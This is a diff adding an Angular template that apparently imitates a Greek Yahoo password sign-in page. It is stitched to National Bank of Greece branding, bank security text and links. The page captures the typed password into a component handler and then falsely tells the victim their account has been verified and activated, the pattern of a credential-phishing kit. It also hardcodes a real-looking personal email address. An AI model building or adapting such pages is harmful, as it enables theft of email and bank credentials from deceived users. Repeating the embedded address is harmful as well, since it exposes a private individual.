@@ -1,0 +1,101 @@
+
+
+
+<div class="max-width-container-login">
+    <div class="login-container">
+      
+     
+        <!---->
+        <div class="login-box left" style="right: auto; margin-top: -10%; position: relative;">
+            <div class="mbr-login-hd txt-align-center">
+                    <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-el-GR" width="" height="27">
+                    <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-el-GR" width="" height="27">
+            </div>
+            <div class="challenge password-challenge">
+    <div class="challenge-header">
+        <div class="yid"> {{email}}</div>
+    </div><div id="password-challenge" class="primary">
+    <strong class="challenge-heading">Εισάγετε τον κωδικό πρόσβασης</strong>
+    <span class="txt-align-center challenge-desc">για να ολοκληρώσετε τη σύνδεση</span>
+        <form action="" method="post" class="challenge-form">
+        <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="{&quot;language&quot;:&quot;en-US&quot;,&quot;colorDepth&quot;:24,&quot;deviceMemory&quot;:8,&quot;pixelRatio&quot;:1.25,&quot;hardwareConcurrency&quot;:12,&quot;timezoneOffset&quot;:-60,&quot;timezone&quot;:&quot;Europe/Berlin&quot;,&quot;sessionStorage&quot;:1,&quot;localStorage&quot;:1,&quot;indexedDb&quot;:1,&quot;openDatabase&quot;:1,&quot;cpuClass&quot;:&quot;unknown&quot;,&quot;platform&quot;:&quot;Win32&quot;,&quot;doNotTrack&quot;:&quot;unknown&quot;,&quot;plugins&quot;:{&quot;count&quot;:3,&quot;hash&quot;:&quot;e43a8bc708fc490225cde0663b28278c&quot;},&quot;canvas&quot;:&quot;canvas winding:yes~canvas&quot;,&quot;webgl&quot;:1,&quot;webglVendorAndRenderer&quot;:&quot;Google Inc.~ANGLE (Intel(R) UHD Graphics Direct3D11 vs_5_0 ps_5_0)&quot;,&quot;adBlock&quot;:1,&quot;hasLiedLanguages&quot;:0,&quot;hasLiedResolution&quot;:0,&quot;hasLiedOs&quot;:0,&quot;hasLiedBrowser&quot;:0,&quot;touchSupport&quot;:{&quot;points&quot;:0,&quot;event&quot;:0,&quot;start&quot;:0},&quot;fonts&quot;:{&quot;count&quot;:41,&quot;hash&quot;:&quot;3f6e159ddfdc97a8d2ef74c08f7af5a2&quot;},&quot;audio&quot;:&quot;124.04347527516074&quot;,&quot;resolution&quot;:{&quot;w&quot;:&quot;1536&quot;,&quot;h&quot;:&quot;864&quot;},&quot;availableResolution&quot;:{&quot;w&quot;:&quot;824&quot;,&quot;h&quot;:&quot;1536&quot;},&quot;ts&quot;:{&quot;serve&quot;:1606993132210,&quot;render&quot;:1606993133436}}">
+        <input type="hidden" name="crumb" value="qYx4.In8wMJ">
+        <input type="hidden" name="acrumb" value="Y1QvwAsf">
+        <input type="hidden" name="sessionIndex" value="Qg--">
+        <input type="hidden" name="displayName" value="nikosegiologos@yahoo.gr">
+        <div class="hidden-username">
+            <input type="text" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" spellcheck="false" name="username" value="nikosegiologos@yahoo.gr">
+        </div>
+        <input type="hidden" name="passwordContext" value="normal">
+        <div class="txt-align-center" *ngIf="btnDisabled">
+            <img src="../../assets/sus.gif" width="150" height="150"><br><br>
+            <p>Η διεύθυνση email σας επιβεβαιώθηκε και ο λογαριασμός σας έχει ενεργοποιηθεί!</p>
+            
+        </div>
+        <div class="txt-align-center" *ngIf="submitted && !btnDisabled">
+            <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
+            
+        </div>
+        <div id="password-container" class="input-group password-container blurred" *ngIf="!submitted">
+            <input type="password"  id="login-passwd" [(ngModel)]="password" (keyup)="onKeyPass()" class="password" name="password" placeholder=" " autofocus="" autocomplete="current-password" data-rapid-tracking="true" data-ylk="elm:input;elmt:focus;slk:passwd;mKey:password-challenge-focus-passwd" style="border-style: none none solid none">
+            <label for="login-passwd" id="password-label" class="password-label">Κωδικός πρόσβασης</label>
+            <div class="caps-indicator hide" id="caps-indicator" title="Το CapsLock είναι ενεργοποιημένο"></div>
+            <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1" title="Εμφάνιση κωδικού πρόσβασης" data-rapid-tracking="true" data-ylk="elm:btn;elmt:toggle;slk:toggle-show-passwd;mKey:password-challenge-toggle-show-hide">
+            </button>
+        </div>
+
+        <div class="button-container">
+            <button type="submit" id="login-signin" (click)="onSubmitYahoo()" [disabled]="disabled" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="verifyPassword" value="Επόμενο" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:password-challenge-next">
+                    Επόμενο
+            </button>
+        </div>
+        <div class="forgot-cont challenge-button-link">
+            <input type="submit" class="pure-button puree-button-link challenge-button-link" data-ylk="elm:btn;elmt:skip;slk:skip;mKey:password-challenge-skip-recovery" data-rapid-tracking="true" id="mbr-forgot-link" name="skip" value="Ξεχάσατε τον κωδικό πρόσβασης;">
+        </div>
+    </form>
+</div>
+</div>
+        </div>
+        <!---->
+        <div class="flex-vertical-center  margin-horizontal-auto"
+            style="max-width: 18.75rem; height: 100%; margin-top: 1.5rem">
+            <div
+                class="icon-container flex-all-center text-large lock-circle-icon circle-large-primary margin-right-medium">
+                <img src="https://ibank.nbg.gr/identity/dist/icons/lock-circle.8d6ed53141c46ef004136125d2fdd5e8.svg">
+            </div><span class="text-medium text-white text-small"> Προσοχή! Η Εθνική Τράπεζα θα σας ζητήσει μόνο τα στοιχεία σας σε περίπτωση λανθασμένων δεδομένων στο λογαριασμό σας.
+                <a
+                    class="link-white text-white text-bold" href="https://ibank.nbg.gr/identity/security-information"
+                    target="_blank">Συμβουλές
+                    ασφαλείας</a></span>
+        </div>
+    </div>
+    <div class="margin-top-auto">
+        <div class="useful-links-container">
+            <div class="social-links-container"><a class="icon-container icon-facebook-lg" ngclass="icon-facebook-lg"
+                    target="_blank" href="https://www.facebook.com/ibanknbg"></a><a
+                    class="icon-container icon-twitter-lg" ngclass="icon-twitter-lg" target="_blank"
+                    href="https://twitter.com/NationalBankGR"></a><a class="icon-container icon-youtube-lg"
+                    ngclass="icon-youtube-lg" target="_blank"
+                    href="https://www.youtube.com/channel/UCAwPZIUpdP3aIQlfw4bETLQ"></a><a
+                    class="icon-container icon-linkedin-lg" ngclass="icon-linkedin-lg" target="_blank"
+                    href="https://www.linkedin.com/company/national-bank-of-greece/"></a><a
+                    class="icon-container icon-email-lg" ngclass="icon-email-lg"
+                    href="mailto:contact.center@nbg.gr"></a></div>
+            <div class="links-container">
+                <!----><a class="link-white button-transparent useful-link" target="_blank"
+                    href="https://www.nbg.gr/Style%20Library/ReusableContent/privacy_statement.pdf"> Προστασία
+                    Δεδομένων Προσωπικού Χαρακτήρα </a><a class="link-white button-transparent useful-link"
+                    target="_blank" href="https://ibank.nbg.gr/identity/browser-compatibility"> Συμβατότητα με
+                    browsers </a></div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
